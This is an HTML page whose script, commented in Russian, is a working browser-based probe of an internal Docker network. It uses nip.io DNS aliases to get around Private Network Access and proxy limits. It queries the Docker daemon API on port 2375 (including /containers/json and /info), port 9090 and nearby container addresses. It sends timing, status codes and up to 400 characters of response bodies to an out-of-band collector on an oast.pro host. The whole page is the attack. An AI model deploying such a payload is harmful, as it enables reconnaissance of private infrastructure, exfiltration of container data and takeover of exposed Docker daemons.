<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}
fire('/alive13?t=0');

function keepAlive(url) {
  var s = document.createElement('script');
  s.src = url;
  document.head.appendChild(s);
}
// keepAlive via nip.io — тест обхода PNA через DNS-псевдоним
keepAlive('http://172-17-0-1.nip.io:2375/_ping');
keepAlive('http://172-17-0-1.nip.io:9090/');

// CORS fetch: cf-ok = CORS открыт, тело прочитано; cf-err = CORS заблокировал (но соединение было); cf-to = прокси/таймаут
function cf(label, url, ms) {
  var t0 = Date.now();
  fetch(url, {mode: 'cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
    .then(function(r) {
      return r.text().then(function(b) {
        fire('/cf-ok-' + label + '?ms=' + (Date.now()-t0)
          + '&s=' + r.status + '&b=' + encodeURIComponent(b.slice(0, 400)));
      });
    })
    .catch(function(e) {
      var el = Date.now() - t0;
      fire('/cf-' + (el >= ms-200 ? 'to' : 'err') + '-' + label
        + '?ms=' + el + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
    });
}

// no-cors fetch: nc-ok = соединение установлено (response opaque); nc-err/nc-to = ошибка/таймаут
function nc(label, url, ms) {
  var t0 = Date.now();
  fetch(url, {mode: 'no-cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
    .then(function(r) {
      fire('/nc-ok-' + label + '?ms=' + (Date.now()-t0) + '&type=' + r.type);
    })
    .catch(function(e) {
      var el = Date.now() - t0;
      fire('/nc-' + (el >= ms-200 ? 'to' : 'err') + '-' + label
        + '?ms=' + el + '&e=' + encodeURIComponent(e.message.slice(0, 60)));
    });
}

// КЛЮЧЕВОЙ ТЕСТ: raw IP (v12 → 9s прокси-таймаут) vs nip.io (обход прокси?)
nc('raw-dapi',   'http://172.17.0.1:2375/_ping',           12000); // ref: должен упасть в ~9с
nc('nip-dapi',   'http://172-17-0-1.nip.io:2375/_ping',    12000); // если nc-ok → прокси обойдён!
nc('nip-dcont',  'http://172-17-0-1.nip.io:2375/containers/json', 12000);
nc('nip-9090',   'http://172-17-0-1.nip.io:9090/',         12000);
nc('nip-c2',     'http://172-17-0-2.nip.io/',               12000);
nc('nip-c3',     'http://172-17-0-3.nip.io/',               12000);

// CORS fetch с nip.io — если прокси обойдён и сервис отдаёт CORS → читаем тело!
cf('nip-dapi',   'http://172-17-0-1.nip.io:2375/_ping',             12000);
cf('nip-dcont',  'http://172-17-0-1.nip.io:2375/containers/json',   12000);
cf('nip-dinfo',  'http://172-17-0-1.nip.io:2375/info',              12000);
cf('nip-9090',   'http://172-17-0-1.nip.io:9090/',                  12000);
cf('nip-c2',     'http://172-17-0-2.nip.io/',                        12000);
cf('nip-c3',     'http://172-17-0-3.nip.io/',                        12000);
cf('nip-c2-8k',  'http://172-17-0-2.nip.io:8080/',                   12000);
cf('nip-c3-8k',  'http://172-17-0-3.nip.io:8080/',                   12000);
</script>
</body>
</html>
